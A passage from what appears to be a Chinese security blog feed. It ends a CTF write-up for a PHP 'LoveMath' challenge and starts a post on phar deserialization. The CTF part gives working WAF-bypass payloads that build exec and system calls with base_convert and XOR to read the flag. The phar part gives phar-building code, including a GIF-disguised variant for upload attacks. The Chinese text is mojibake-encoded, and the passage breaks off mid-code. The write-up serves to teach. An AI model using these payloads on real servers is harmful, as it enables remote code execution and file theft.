function">hexdec</span><span class="token punctuation">(</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$num</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">3761671484</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>è¾“å‡ºçš„ç»“æœæ—¢æ˜¯å¯ä¼ å…¥çš„å€¼</p><h3 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">,</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">47138</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">8768397090111664438</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p>åˆ†æï¼š</p><ul><li><code>base_convert(47138,20,36)  ==&gt;  exec</code>ï¼Œexecæ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åºï¼Œè¿”å›æœ€åä¸€è¡Œå†…å®¹</li><li><code>base_convert(8768397090111664438,10,30)  ==&gt;   getallheaders</code>ï¼Œè·å–å…¨éƒ¨ HTTP è¯·æ±‚å¤´ä¿¡æ¯</li><li>ä»¥ä¸Šè¯­å¥ç¿»è¯‘ä¸‹æ¥å°±æ˜¯<code>exec(getallheaders()&#123;1&#125;)</code>ï¼Œå¯ä»¥è·å–è¯·æ±‚å¤´ç¬¬ä¸€ä¸ªå­—æ®µçš„å€¼ï¼Œ<code>[]</code>è¢«wafå¯ä»¥ç”¨<code>&#123;&#125;</code>åŒ…å›Šæ•°å­—æ¥è§£å†³ä»£æ›¿ç»•è¿‡ä¸­æ‹¬å·å’Œå¼•å·</li></ul><p>å‘åŒ…å³å¯æ‹¿åˆ°flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CISCN-LoveMath-php%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C/image-20200517213809635.png" alt loading="lazy"></p><p>å½“ç„¶è¿™é‡Œç›´æ¥<code>cat flag</code>ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token operator">=</span>base_convert<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">47138</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">(</span><span class="token number">3761671484</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">109270211243818</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>å‘½ä»¤æ‰§è¡Œå°±æ˜¯<code>exec(&quot;cat /*&quot;)</code>ï¼Œå¯ä»¥æ‰“å°å‡ºflag</p><h3 id="æ–¹æ³•ä¸‰"><a href="#æ–¹æ³•ä¸‰" class="headerlink" title="æ–¹æ³•ä¸‰"></a>æ–¹æ³•ä¸‰</h3><p>åˆ©ç”¨å¼‚æˆ–å°†å­—ç¬¦ä¸²è½¬åŒ–æˆæˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚æˆ‘ä»¬éœ€è¦<code>$_GET</code>ï¼Œé‚£ä¹ˆå°±è¦è·å¾—<code>_GET</code>ï¼ŒFUZZä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span> <span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">&lt;=</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span> <span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"^<span class="token interpolation"><span class="token variable">$i</span></span><span class="token interpolation"><span class="token variable">$j</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"==><span class="token interpolation"><span class="token variable">$exp</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>åœ¨æ‰“å°å‡ºçš„ç»“æœä¸­æœå¯»æƒ³è¦çš„å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°æœ€çŸ­çš„å†ç»„åˆ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token punctuation">(</span>is_nan<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span>tan<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$pi</span><span class="token operator">=</span><span class="token variable">$$pi</span><span class="token punctuation">;</span><span class="token variable">$pi</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token variable">$pi</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0</span><span class="token operator">=</span>system<span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>cat <span class="token operator">/</span>flag</code></pre><ul><li><code>is_nan^(6).(4)  ==&gt;  _G</code></li><li><code>tan^(1).(5)  ==&gt;  ET</code></li><li>ä»¥ä¸Šå°±å’Œç¬¬ä¸€ç§æ–¹æ³•ç±»ä¼¼ï¼Œç„¶ååœ¨ä¼ å‘½ä»¤æ‰§è¡Œçš„ä»£ç å°±å¯ä»¥äº†</li></ul><p>å‚è€ƒï¼š</p><ul><li><a href="https://www.cnblogs.com/20175211lyz/p/11588219.html">https://www.cnblogs.com/20175211lyz/p/11588219.html</a></li><li><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html">https://www.cnblogs.com/wangtanzhi/p/12246731.html</a></li></ul><p>é¢˜ç›®è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼Œå¦‚æœå†å‘ç°æ–°æ–¹æ³•å†è¡¥ä¸Š</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> CTFé¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pharååºåˆ—åŒ–æµ…æ</title>
      <link href="posts/bb56c28a/"/>
      <url>posts/bb56c28a/</url>
      
        <content type="html"><![CDATA[<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://xz.aliyun.com/t/2958#toc-2">Pharä¸Stream Wrapperé€ æˆPHP RCEçš„æ·±å…¥æŒ–æ˜</a></li><li><a href="https://www.freebuf.com/articles/web/205943.html">PHARååºåˆ—åŒ–æ‹“å±•æ“ä½œæ€»ç»“</a></li><li><a href="https://paper.seebug.org/680/">åˆ©ç”¨ phar æ‹“å±• php ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢</a></li></ul><span id="more"></span><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><h4 id="pharæ–‡ä»¶ç»“æ„"><a href="#pharæ–‡ä»¶ç»“æ„" class="headerlink" title="pharæ–‡ä»¶ç»“æ„"></a>pharæ–‡ä»¶ç»“æ„</h4><p><strong>â‘ </strong>  <strong>a stub</strong></p><p>å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ ‡å¿—ï¼Œæ ¼å¼ä¸º<code>xxx</code>ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥<code>__HALT_COMPILER();?&gt;</code>æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶ã€‚</p><p><strong>â‘¡</strong>  <strong>a manifest describing the contents</strong></p><p>pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥<strong>åºåˆ—åŒ–</strong>çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„<code>meta-data</code>ï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504124151781.png" alt loading="lazy"></p><p><strong>â‘¢</strong>  <strong>the file contents</strong></p><p>è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹ã€‚</p><p><strong>â‘£</strong>  <strong>a signature for verifying Phar integrity (phar file format only)</strong></p><p>ç­¾åï¼Œæ”¾åœ¨æ–‡ä»¶æœ«å°¾ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504124231445.png" alt loading="lazy"></p><p>é€šè¿‡<code>phar://</code>ä¼ªåè®®å¯¹ä¸€ä¸ª<strong>phar</strong>æ–‡ä»¶è¿›è¡Œäº†æ–‡ä»¶æ“ä½œçš„æ—¶å€™ï¼Œå°±å¯ä»¥è§¦å‘ååºåˆ—åŒ–ï¼Œè¾¾åˆ°<strong>RCE</strong>çš„æ•ˆæœ</p><h4 id="äº§ç”Ÿç¼˜ç”±"><a href="#äº§ç”Ÿç¼˜ç”±" class="headerlink" title="äº§ç”Ÿç¼˜ç”±"></a>äº§ç”Ÿç¼˜ç”±</h4><p>åœ¨<a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618">phar.c#L618</a>å¤„ï¼Œå…¶è°ƒç”¨äº†<code>php_var_unserialize</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504120955832.png" alt loading="lazy"></p><p>å› æ­¤å¯ä»¥æ„é€ ä¸€ä¸ªç‰¹æ®Šçš„pharåŒ…ï¼Œä½¿å¾—ä»£ç èƒ½å¤Ÿååºåˆ—åŒ–ï¼Œä»è€Œæ„é€ ä¸€ä¸ªpopé“¾ï¼Œåœ¨ä½¿ç”¨<code>phar://</code>åè®®è¯»å–æ–‡ä»¶çš„æ—¶å€™ï¼Œæ–‡ä»¶ä¼šè¢«è§£ææˆphar (<a href="https://www.php.net/manual/zh/intro.phar.php">https://www.php.net/manual/zh/intro.phar.php</a>) çš„è¿‡ç¨‹ä¼šè§¦å‘<code>php_var_unserialize</code>å‡½æ•°å¯¹<strong>meta-data</strong>çš„æ“ä½œï¼Œé€ æˆååºåˆ—åŒ–ã€‚</p><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p><strong>æ¡ä»¶</strong></p><ul><li>pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚</li><li>è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ã€‚</li><li>æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”<code>:</code>ã€<code>/</code>ã€<code>phar</code>ç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚</li></ul><p>æœ‰åºåˆ—åŒ–æ•°æ®å¿…ç„¶ä¼šæœ‰ååºåˆ—åŒ–æ“ä½œï¼Œphpä¸€å¤§éƒ¨åˆ†çš„<a href="http://php.net/manual/en/ref.filesystem.php">æ–‡ä»¶ç³»ç»Ÿå‡½æ•°</a>åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼Œæµ‹è¯•åå—å½±å“çš„å‡½æ•°å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504120506980.png" alt loading="lazy"></p><ul><li><strong>exif</strong>ï¼š<code>exif_thumbnail</code>ï¼Œ<code>exif_imagetype</code></li><li><strong>gd</strong>ï¼š<code>imageloadfont</code>ï¼Œ<code>imagecreatefrom***</code></li><li><strong>hash</strong>ï¼š<code>hash_hmac_file</code>ï¼Œ<code>hash_file</code>ï¼Œ<code>hash_update_file</code>ï¼Œ<code>md5_file</code>ï¼Œ<code>sha1_file</code></li><li><strong>file/url</strong>ï¼š<code>get_meta_tags</code>ï¼Œ<code>get_headers</code></li><li><strong>standard</strong>ï¼š<code>getimagesize</code>ï¼Œ<code>getimagesizefromstring</code></li></ul><p><strong>zip</strong>ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$zip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'c.zip'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$zip</span><span class="token operator">-></span><span class="token function">extractTo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar://test.phar/test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>é™åˆ¶<code>phar://</code>ä¸èƒ½å‡ºç°åœ¨å¤´å‡ ä¸ªå­—ç¬¦ï¼Œäº¦é€‚ç”¨äº<code>compress.zlib://</code>ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$z</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'compress.bzip2://phar:///home/sx/test.phar/test.txt'</span><span class="token punctuation">;</span></code></pre><p><strong><a href="https://baike.baidu.com/item/PostgreSQL/530240?fr=aladdin">PostgreSQL</a></strong>ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pgsql:host=%s;dbname=%s;user=%s;password=%s"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"postgres"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"sx"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"123456"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">pgsqlCopyFromFile</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aa'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'phar://test.phar/aa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><code>pgsqlCopyToFile</code>å’Œ<code>pg_trace</code>åŒæ ·èƒ½ä½¿ç”¨çš„ï¼Œéœ€è¦å¼€å¯<code>phar</code>çš„å†™åŠŸèƒ½ã€‚</p><h3 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h3><p>ç”Ÿæˆ<strong>phar</strong>æ–‡ä»¶ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//åç¼€åå¿…é¡»ä¸ºphar</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è®¾ç½®stub</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span>    <span class="token comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>notepadæ‰“å¼€æŸ¥çœ‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504131930692.png" alt loading="lazy"></p><p>æ˜æ˜¾çš„åºåˆ—åŒ–å­˜å‚¨</p><p>æ„é€ åˆ©ç”¨ä»£ç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Destruct called'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phar://phar.phar/a_random_string'</span><span class="token punctuation">;</span>    <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>æˆåŠŸæ‰“å°ç»“æœï¼Œå½“ç„¶è¿™é‡Œæ¢å…¶ä»–çš„æ–‡ä»¶æ“ä½œå‡½æ•°ä¹Ÿå¯ä»¥</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504132140672.png" alt loading="lazy"></p><p><strong>å°†pharä¼ªé€ æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶</strong></p><p>åœ¨å‰é¢åˆ†æpharçš„æ–‡ä»¶ç»“æ„æ—¶å¯èƒ½ä¼šæ³¨æ„åˆ°ï¼Œphpè¯†åˆ«pharæ–‡ä»¶æ˜¯é€šè¿‡å…¶æ–‡ä»¶å¤´çš„stubï¼Œæ›´ç¡®åˆ‡ä¸€ç‚¹æ¥è¯´æ˜¯<code>__HALT_COMPILER();?&gt;</code>è¿™æ®µä»£ç ï¼Œå¯¹å‰é¢çš„å†…å®¹æˆ–è€…åç¼€åæ˜¯æ²¡æœ‰è¦æ±‚çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ·»åŠ ä»»æ„çš„æ–‡ä»¶å¤´+ä¿®æ”¹åç¼€åçš„æ–¹å¼å°†pharæ–‡ä»¶ä¼ªè£…æˆå…¶ä»–æ ¼å¼çš„æ–‡ä»¶ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">TestObject</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span>    <span class="token comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span>    <span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span 